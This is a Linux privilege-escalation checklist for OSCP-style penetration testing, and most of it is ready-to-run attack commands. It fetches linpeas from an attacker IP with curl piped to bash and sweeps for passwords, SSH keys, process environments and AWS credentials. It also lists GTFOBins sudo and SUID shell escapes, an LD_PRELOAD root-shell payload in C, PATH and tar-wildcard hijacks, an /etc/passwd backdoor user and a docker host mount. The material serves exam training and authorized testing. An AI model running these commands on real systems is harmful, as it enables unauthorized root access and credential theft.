# Linux Privilege Escalation — OSCP Methodology Checklist

> Run top-to-bottom after landing user.txt. Don't skip steps just because an early vector looks promising — document _why_ each command was run (which enumeration finding justified it) for the report.

---

## 0. Stabilize & Baseline

```bash
# Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg -> reset

whoami; id; hostname
uname -a
cat /etc/os-release
cat /etc/passwd | grep -E "sh$|bash$"   # users with real shells
sudo -l                                  # ALWAYS run this first, no password needed to try
```

**Decision point:** if `sudo -l` returns entries without password prompt → jump straight to §3 (Sudo Abuse). This is the single highest-yield first command.

---

## 1. Automated Enumeration (run in background, read manually anyway)

```bash
# Transfer & run (pick 2, don't rely on one)
curl http://<attacker_ip>/linpeas.sh | bash
./linenum.sh -t          # thorough mode
python3 lse.sh -l1       # linux-smart-enumeration, level 1 first, then -l2
```

**Decision point:** linpeas output is noisy — search for `groups`, `Files with capabilities`, `SUID`, `password` in `[+]`/orange/red highlighted lines first. Never _only_ run linpeas; manually verify anything it flags.

---

## 2. Credential Hunting

Most reliable vector on OSCP boxes. Check in this order:

```bash
# Config/secret files — broad sweep
grep -riE "password|passwd|pw" /etc /var/www /opt /home 2>/dev/null --include=*.{conf,config,ini,env,yml,yaml,xml,php,json}

# History files
cat ~/.bash_history ~/.zsh_history ~/.mysql_history /root/.bash_history 2>/dev/null

# Config files commonly holding creds
find / -name "*.config" -o -name "wp-config.php" -o -name "*.env" 2>/dev/null
cat /var/www/html/**/config.php 2>/dev/null
cat /var/www/html/**/wp-config.php 2>/dev/null

# Backup / old files
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*~" -o -name "*.swp" \) 2>/dev/null

# SSH keys lying around
find / -name "id_rsa*" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null
find / -name "*.git" -type d 2>/dev/null   # then: git log -p in each

# Database creds
find / -name "*.sql" -o -name "*.sqlite" -o -name "database.yml" 2>/dev/null
mysql -u root -p    # try empty password, or found creds

# Memory/proc secrets (if you have read access)
grep -r "password" /proc/*/cmdline 2>/dev/null
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|token"

# Cloud/CI metadata files
cat /home/*/.aws/credentials /home/*/.docker/config.json 2>/dev/null
```

**Decision point:**

- Found DB creds → check if reused for a system user (`su <user>` with same password) or `mysql -u root -p<pass>` for `LOAD_FILE()`/UDF privesc.
- Found `.git` dir → `git log -p` for committed secrets/old configs.
- Found reused password → spray it across all local users in `/etc/passwd`.

---

## 3. Sudo Privileges Abuse

```bash
sudo -l
```

**Decision point — match binary against GTFOBins (https://gtfobins.github.io/), common ones:**

|Binary in sudo -l|Exploit|
|---|---|
|`vim`/`vi`/`nano`|`sudo vim -c ':!/bin/sh'`|
|`less`/`more`/`man`|`sudo less /etc/hosts` → `!/bin/sh`|
|`find`|`sudo find . -exec /bin/sh \; -quit`|
|`python*`/`perl`/`ruby`|`sudo python3 -c 'import os; os.system("/bin/sh")'`|
|`cp`/`mv` (writable target)|overwrite `/etc/passwd` or `/etc/sudoers`|
|`awk`|`sudo awk 'BEGIN {system("/bin/sh")}'`|
|`tar`|`sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh`|
|`systemctl`|`sudo systemctl <malicious .service via edit>`|
|`apt`/`apt-get` (no version pin)|`sudo apt-get changelog apt` → `!/bin/sh`|
|`(ALL) NOPASSWD: /path/to/custom_script`|read script, look for injectable input, wildcard, or writable-by-you path|

**Env-var abuse:**

```bash
sudo -l   # look for env_keep+=LD_PRELOAD or env_keep+=PYTHONPATH
```

```c
// preload.c — if LD_PRELOAD is kept
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash -p"); }
```

```bash
gcc -fPIC -shared -o preload.so preload.c -nostartfiles
sudo LD_PRELOAD=/full/path/preload.so <allowed_binary>
```

---

## 4. SUID / SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
find / -perm -6000 -type f 2>/dev/null 2>&1      # both

# Diff against known-good OS binaries to spot custom SUID
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

**Decision point:**

- Standard binary (find, cp, bash, python, nmap, vim, etc.) with SUID → check GTFOBins for the **SUID column** (not sudo column — different technique, no password needed).
- `nmap` old version (<5.21) → `nmap --interactive` → `!sh`.
- Unknown/custom binary → pull it, run `strings`, `ltrace`, `ghidra`/`objdump -d` locally. Look for:
    - Relative path calls to system binaries (`system("cp ...")` without full path) → PATH hijack
    - Buffer overflow (check with `checksec`)

---

## 5. Capabilities

```bash
getcap -r / 2>/dev/null
```

**Decision point — common exploitable capabilities:**

|Capability|Exploit|
|---|---|
|`cap_setuid+ep` on python/perl|`python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`|
|`cap_dac_read_search+ep`|read any file regardless of perms, e.g. `/etc/shadow`|
|`cap_sys_admin+ep`|often mount-based container escape|
|`cap_setuid` on `perl`|`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`|

---

## 6. Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null
crontab -l
# Watch what actually fires (best evidence, run for 60-90s)
```

```bash
# pspy — no root needed, snapshot process table over time
./pspy64
```

**Decision point:**

- Cron runs a script writable by you → inject reverse shell / append command.
- Cron runs a script via **relative path** or with a weak `$PATH` → PATH hijack (see §7).
- Cron uses `*` wildcard with `tar`/`rsync`/`chown` → wildcard injection (see §11).

---

## 7. PATH Hijacking / Writable Directories

```bash
echo $PATH
find / -writable -type d 2>/dev/null | grep -vE "^/proc"
```

**Decision point:** if a script/cron run as root calls a binary (e.g. `ls`, `cat`) without an absolute path, and a directory earlier in root's `$PATH` (or the script's execution dir) is writable by you:

```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /writable/dir/ls
chmod +x /writable/dir/ls
# wait for cron/root process to trigger
```

---

## 8. NFS Misconfiguration (no_root_squash)

```bash
cat /etc/exports 2>/dev/null            # on target, if readable
showmount -e <target_ip>                # from attacker box
```

**Decision point:** if a share has `no_root_squash`:

```bash
# On attacker box
mkdir /mnt/nfs && mount -o rw,vers=3 <target_ip>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target
/share/bash -p
```

---

## 9. Writable Sensitive Files

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers
find / -writable -name "*.conf" 2>/dev/null
```

**Decision point:**

- `/etc/passwd` writable → append a new root user:

```bash
openssl passwd -1 -salt abc password123
echo 'hacker:$1$abc$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

- `/etc/shadow` writable → overwrite root hash directly.
- `/etc/sudoers` writable → add `<user> ALL=(ALL) NOPASSWD:ALL`.

---

## 10. Kernel & Service Exploits (last resort — noisy, can crash box)

```bash
uname -a
searchsploit "Linux Kernel $(uname -r)"
# Cross-check with linux-exploit-suggester
./linux-exploit-suggester.sh
```

**Common OSCP-relevant kernel/service CVEs to check version against:**

- DirtyCow (CVE-2016-5195) — kernel <4.8.3
- DirtyPipe (CVE-2022-0847) — kernel 5.8–5.16.11
- PwnKit (CVE-2021-4034) — polkit's pkexec, almost all distros pre-2022 patch
- Sudo Baron Samedit (CVE-2021-3156) — `sudo -V` (< 1.9.5p2)
- overlayfs (CVE-2021-3493 / CVE-2015-1328)

```bash
sudo -V   # check for Baron Samedit
pkexec --version   # or just check if pkexec exists → try PwnKit exploit
```

**Decision point:** only reach for a kernel exploit after all manual vectors above are exhausted — OSCP exam grading favors documented manual reasoning, and kernel exploits can crash the target.

---

## 11. Wildcard Injection

```bash
# Look for cron/scripts running tar/rsync/chown/chmod with *
grep -r "\*" /etc/cron* 2>/dev/null
```

**Decision point:** if root runs e.g. `tar czf /backup.tar.gz *` inside a directory you can write to:

```bash
cd /writable/dir
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo '#!/bin/bash
chmod +s /bin/bash' > privesc.sh
chmod +x privesc.sh
# wait for cron
```

---

## 12. Docker / Container Escape

```bash
# Am I inside a container?
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv

# Docker group membership without direct root
id | grep docker
```

**Decision point:**

- In `docker` group → mount host filesystem:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- Inside a container with `cap_sys_admin` and writable cgroup release_agent → classic cgroup escape.

---

## 13. Internal Services / Port Forwarding

```bash
ss -tulnp
netstat -tulnp 2>/dev/null
```

**Decision point:** internal-only port (127.0.0.1:xxxx) running a web app/DB → chisel/SSH local port forward and hit it from attacker box; check for default creds or an unpatched CVE on that service version.

---

## Attack Path Priority Order (fastest wins first)

1. `sudo -l` → GTFOBins
2. Credential reuse (found in files/history → su / mysql / ssh)
3. SUID binaries (GTFOBins SUID column)
4. Cron jobs (writable script / PATH hijack / wildcard)
5. Capabilities (`getcap -r /`)
6. Writable `/etc/passwd` or `/etc/shadow`
7. NFS `no_root_squash`
8. Kernel exploit (PwnKit / DirtyPipe / Baron Samedit — check versions early even if you exploit last)
9. Docker group / container escape

**Most common on OSCP-style boxes, in observed frequency:** sudo misconfig with GTFOBins-able binary > credential reuse from a config/backup file > cron job writable script > SUID custom binary with a coded flaw > capabilities on python/perl.